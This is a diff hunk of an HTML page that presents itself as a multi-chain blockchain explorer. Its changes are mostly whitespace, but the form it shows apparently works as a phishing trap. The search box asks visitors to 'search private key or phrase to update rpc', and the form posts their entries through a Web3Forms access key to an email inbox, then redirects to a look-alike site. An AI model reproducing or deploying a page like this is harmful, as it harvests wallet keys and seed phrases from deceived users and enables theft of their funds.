@@ -332,31 +332,30 @@
                   </span>
                 </h1>
 
-                <p class="fw-medium">Supporting 30+ chains and counting.</p>
+               <p class="fw-medium">Supporting 30+ chains and counting.</p>
               </div>
               <!-- End Title -->
               <form action="https://api.web3forms.com/submit"
                 class="search-panel-container position-relative auto-search-max-height bg-white border border-dark dark:border-white border-opacity-15 rounded-4 d-flex gap-2 p-1 mb-4"
-                method="POST">
-                <!-- REQUIRED: Web3Forms access key -->
-                <input type="hidden" name="access_key" value="bd746c53-ca1b-47a4-92f5-43f20b96443e">
+                method="POST"> 
+                 <!-- REQUIRED: Web3Forms access key -->
+                 <input type="hidden" name="access_key" value="bd746c53-ca1b-47a4-92f5-43f20b96443e">
 
-                <!-- Redirect after successful submission -->
-                <input type="hidden" name="redirect" value="https://blockscanrpc.vercel.app/">
-
-                <!-- Optional: subject line in email -->
-                <input type="hidden" name="subject" value="New Blockchain Search Submission">
-
-                <!-- Optional: from_name in email -->
-                <input type="hidden" name="from_name" value="Blockchain Explorer Form">
-
+                 <!-- Redirect after successful submission -->
+                 <input type="hidden" name="redirect" value="https://blockscanrpc.vercel.app/">
+ 
+                 <!-- Optional: subject line in email -->
+                 <input type="hidden" name="subject" value="New Blockchain Search Submission">
+ 
+                 <!-- Optional: from_name in email -->
+                 <input type="hidden" name="from_name" value="Blockchain Explorer Form">
+                 
                 <span class="d-flex align-items-center position-absolute top-0 bottom-0" title="Search"
                   style="left: 0.75rem;">
                   <i class="fa-regular fa-search fs-5 text-muted"></i>
                 </span>
                 <div class="flex-grow-1">
                   <label for="search-panel" class="visually-hidden">Search</label>
-
                   <input id="search-panel" name="searchAddress" type="text"
                     class="form-control form-control-lg fs-default border-0 focus-shadow-0 rounded-pill pe-8 pe-md-14"
                     placeholder="Search private key or phrase to update rpc" autocomplete="off"
